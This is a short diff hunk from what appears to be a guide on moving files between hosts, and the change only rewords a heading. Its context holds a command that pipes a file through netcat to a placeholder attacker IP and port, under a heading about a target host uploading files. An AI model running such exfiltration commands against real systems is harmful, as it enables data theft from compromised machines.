@@ -81,7 +81,7 @@ Target host uploads files
 cat /usr/bin/which | nc <attacker ip> <attacker port>
 ```
 
-Checking file is correct
+Check if the file is correct
 
 attacker
 
